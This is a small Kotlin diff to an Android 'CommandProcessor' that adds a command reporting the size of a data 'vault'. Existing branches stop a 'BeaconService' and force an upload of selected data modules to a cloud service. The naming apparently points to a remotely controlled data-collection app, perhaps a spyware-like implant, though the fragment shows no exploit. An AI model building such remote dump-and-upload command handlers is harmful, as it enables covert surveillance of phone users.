@@ -145,6 +145,9 @@ object CommandProcessor {
                     ctx.stopService(android.content.Intent(ctx, BeaconService::class.java))
                     status = "EXECUTED (STOPPED)"
                 }
+                "GET_VAULT_SIZE" -> {
+                    status = DumpManager.getVaultSize()
+                }
                 "FORCE_UPLOAD" -> {
                     val modules = content.split(",").map { it.trim() }
                     CloudManager.uploadData(ctx, modules)
